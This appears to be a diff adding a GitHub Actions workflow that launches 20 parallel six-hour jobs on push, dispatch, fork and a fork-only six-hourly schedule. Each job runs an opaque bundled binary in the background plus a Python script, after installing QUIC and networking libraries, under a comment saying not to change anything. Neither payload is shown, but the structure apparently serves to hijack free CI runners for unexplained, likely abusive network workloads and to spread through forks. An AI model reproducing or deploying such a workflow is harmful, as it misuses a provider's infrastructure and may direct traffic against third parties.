@@ -1,0 +1,65 @@
+name: BRANCH PUSH ARC-X86_64
+
+#JANGAN ADA YANG DI UBAH
+#DO NOT CHANGE ANYTHING
+
+on:
+  workflow_dispatch:
+  
+  push:
+    branches: [ main, master ]
+    
+  fork:
+
+  schedule:
+    - cron: '0 */6 * * *'
+
+concurrency:
+  group: arc-runner
+  cancel-in-progress: true
+
+jobs:
+  run-linux-combo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      github.event_name == 'push' ||
+      github.event_name == 'fork' ||
+      (github.event_name == 'schedule' && github.event.repository.fork == true)
+
+    strategy:
+      matrix:
+        id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      fail-fast: false
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12.3'
+
+      - name: Install dependencies
+        run: pip install requests aioquic uvloop
+
+      - name: Check Status
+        run: |
+          echo "Run Reason: ${{ github.event_name }}"
+          echo "Is Fork: ${{ github.event.repository.fork }}"
+          echo "Repo Owner: ${{ github.repository_owner }}"
+
+      - name: Run Double Mode (Binary + Python)
+        run: |
+          if [ -f "./arc-x86_64" ]; then
+            chmod +x ./arc-x86_64
+            echo "🚀 [1/2] Menjalankan Binary di Background..."
+            ./arc-x86_64 &
+          else
+            echo "⚠️ Binary tidak ditemukan, skip..."
+          fi
+
+          echo "🚀 [2/2] Menjalankan Python arc Script..."
+          python3 arc-x86_64.py
